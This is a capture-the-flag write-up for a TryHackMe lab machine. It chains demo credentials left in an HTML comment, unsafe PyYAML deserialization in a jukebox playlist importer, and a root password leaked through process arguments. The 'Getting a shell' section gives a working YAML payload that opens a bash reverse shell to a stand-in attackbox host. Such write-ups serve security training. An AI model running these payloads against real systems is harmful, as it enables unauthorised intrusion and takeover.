---
title: "TryHackMe - Byte Lotus: Beach Bar"
date: 2026-07-31
tags: ["TryHackMe", "Penetration Testing", "Web Security", "YAML Deserialization", "RCE", "Privilege Escalation", "Credential Reuse"]
excerpt: "Hardcoded demo creds lead to a PyYAML deserialization RCE in a jukebox playlist importer, then a root-owned process leaks its own password on the command line for an easy privesc."
---

# TryHackMe: Byte Lotus — Beach Bar

**Room theme:** The Byte Lotus's beachside guest-experience build — a jukebox web app "shipped on a deadline" by the night-shift developer, who "wired the jukebox straight into the floor with the trimmings still attached."

**Goal:** Get the user flag and the root flag. This one had an attackbox and a dedicated lab machine rather than a standalone capture file.

## Recon

Full port scan against the lab machine turned up just two services:

```
nmap -p- -sV -sC -T4 10.112.152.211
```

- 22/tcp — OpenSSH 9.6p1
- 80/tcp — gunicorn (Flask), redirecting everything to `/login`, page titled "Beach Bar // Sign in"

A Flask app behind gunicorn on port 80, gated by a login page — so the plan was to get authenticated first, then look for the actual vulnerable feature.

## Hardcoded demo credentials

`curl`-ing the login page and reading the raw HTML turned up a comment left in by whoever built the soft-opening version:

```html
<!--
  staff note: the demo DJ login is still enabled for the soft opening.
  dj / dj  -- swap this before the season starts (ticket BAR-7)
-->
```

Logging in with `dj` / `dj` worked immediately and dropped a signed Flask session cookie (`{"user":"dj"}`).

## Finding the injection point

The authenticated dashboard exposed a jukebox "Floor" page with two features: **Export** (download the current playlist as YAML) and **Import** (upload/paste YAML to load a new one). That's the "song queue accepts a little more than song titles" from the room's flavor text — a YAML import feature is a classic home for insecure deserialization.

Pulling the export confirmed the schema:

```yaml
# Beach Bar jukebox playlist export
playlist:
  name: Sunset Session
  vibe: golden hour
  tracks:
    - artist: Khruangbin
      title: Maria Tambien
```

## Confirming unsafe YAML deserialization

Rather than jumping straight to a payload, a harmless timing probe confirmed the app used an unsafe loader before doing anything destructive:

```yaml
!!python/object/apply:time.sleep
args: [8]
```

Submitted via the `/import` form's `playlist` field. The response took ~8 seconds instead of instant — proof the app was executing arbitrary Python objects during YAML parsing, not just validating structure. (Reading the app source later confirmed why: `yaml.load(content, Loader=yaml.Loader)` — the fully unsafe loader — instead of `yaml.safe_load()`.)

One practical snag worth noting: typing `!!` directly on a bash command line triggers bash's history expansion (it means "repeat last command"), even inside double quotes, which mangled the payload the first few tries. Fix was writing the payload to a file with a quoted heredoc delimiter, which bash won't expand:

```bash
cat <<'EOF' > payload.yaml
!!python/object/apply:time.sleep
args: [8]
EOF
```

## Getting a shell

With unsafe deserialization confirmed, the same technique gives full RCE via `subprocess.Popen`:

```bash
cat <<'EOF' > shell.yaml
!!python/object/apply:subprocess.Popen
- ["bash", "-c", "bash -i >& /dev/tcp/ATTACKBOX_IP/4444 0>&1"]
EOF

curl -s -b cookies.txt -X POST http://10.112.152.211/import \
  -F "playlist=<shell.yaml"
```

With a `nc -lvnp 4444` listener running on the attackbox, this landed a shell as `bartender` — the account gunicorn's workers run as.

## User flag

```
cat ~/user.txt
```

```
THM{xxxx}
```

## Privilege escalation

`sudo -l` needed a password we didn't have, no interesting SUID binaries or capabilities, and no reachable internal services beyond DNS and the app itself. The actual lead was in the app's own source and the box's process list.

Reading `/opt/beach-bar/webapp/app.py` confirmed the unsafe `yaml.load()` call and also revealed a hardcoded, fixed Flask `secret_key` — the "DJ who never logs out" clue, though moot once RCE was already in hand.

`ps aux` showed gunicorn's master process running as root but dropping workers to `bartender` (`--user bartender --group bartender`), so editing `app.py` directly wasn't a path to root on its own. The real answer was a second systemd service:

```
systemctl list-units --type=service | grep -i beach
  beachbar.service   ... Beach Bar jukebox web app
  jukeboxd.service   ... Beach Bar jukebox streaming daemon
```

`jukeboxd.service` runs `jukeboxd.py`, a streaming daemon that takes a `--stream-pass` argument. Checking the running process directly:

```
ps aux | grep jukeboxd
```

```
root  609  ... /opt/beach-bar/venv/bin/python /opt/beach-bar/jukeboxd/jukeboxd.py --stream-pass xxxx! --bitrate 320k
```

Command-line arguments are visible to any local user via `ps` — this is the "service down the boardwalk quietly announcing 'something'" from the room's intro. The daemon runs as root and leaks its own password in plaintext to anyone who looks.

That password turned out to be reused for the root account itself:

```
su root
Password: xxxx!
```

## Root flag

```
cat /root/root.txt
```

```
THM{xxxx}
```

## Full chain summary

1. Hardcoded demo creds (`dj`/`dj`) left in an HTML comment → authenticated access.
2. Jukebox playlist "Import" feature uses `yaml.load()` with the unsafe `Loader` → arbitrary Python object deserialization.
3. `!!python/object/apply:subprocess.Popen` payload → reverse shell as `bartender`.
4. Root-owned `jukeboxd.service` passes its password as a CLI argument (`--stream-pass`), visible to any local user via `ps`.
5. Password reuse: the leaked stream password is also root's login password → full root.

